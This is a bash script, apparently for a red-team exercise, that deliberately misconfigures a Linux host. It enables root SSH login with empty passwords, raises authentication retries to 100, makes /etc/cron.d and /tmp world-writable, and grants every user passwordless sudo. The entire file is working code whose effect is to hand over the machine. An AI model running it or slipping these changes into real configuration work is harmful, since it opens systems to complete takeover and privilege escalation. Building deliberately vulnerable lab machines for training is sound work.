#!/bin/bash

# --- SSH Misconfigurations ---
SSHD_CONFIG="/etc/ssh/sshd_config"

sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' "$SSHD_CONFIG"
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' "$SSHD_CONFIG"
sed -i 's/^#*PermitEmptyPasswords.*/PermitEmptyPasswords yes/' "$SSHD_CONFIG"
echo "MaxAuthTries 100" >> "$SSHD_CONFIG"

systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
echo "[RED TEAM] SSH misconfigured"

# --- World-writable sensitive directories ---
chmod 777 /etc/cron.d
chmod 777 /tmp
echo "[RED TEAM] Permissions loosened" >> /tmp/redteam_actions.log

# --- Weak sudoers entry ---
echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "[RED TEAM] Sudoers weakened" 

echo "[RED TEAM] Misconfigurations complete"